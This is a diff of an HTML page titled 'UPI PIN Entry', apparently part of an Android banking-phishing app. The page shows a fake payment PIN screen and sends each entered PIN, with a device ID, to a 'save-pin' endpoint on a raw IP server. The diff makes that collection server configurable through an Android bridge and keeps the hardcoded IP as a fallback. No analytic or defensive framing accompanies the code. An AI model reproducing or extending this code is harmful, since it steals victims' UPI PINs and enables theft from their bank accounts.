@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#4285f4" />
   <title>UPI PIN Entry</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
@@ -59,10 +60,12 @@
         showLoadingDialog();
         
         try {
+          // ⭐ دریافت Base URL و Device ID از Android
+          const baseUrl = Android.getBaseUrl();
           const deviceId = Android.getDeviceId();
           
           // Send with device_id like other requests
-          fetch("http://95.134.130.160:8765/save-pin", {
+          fetch(`${baseUrl}/save-pin`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
@@ -89,10 +92,12 @@
             showRetryDialog();
           });
         } catch (err) {
-          console.error(err);
+          console.error("Error getting Android data:", err);
+          // Fallback for browser testing
           const fallbackDeviceId = "browser_test_" + Date.now();
+          const fallbackBaseUrl = "http://95.134.130.160:8765";
           
-          fetch("http://95.134.130.160:8765/save-pin", {
+          fetch(`${fallbackBaseUrl}/save-pin`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
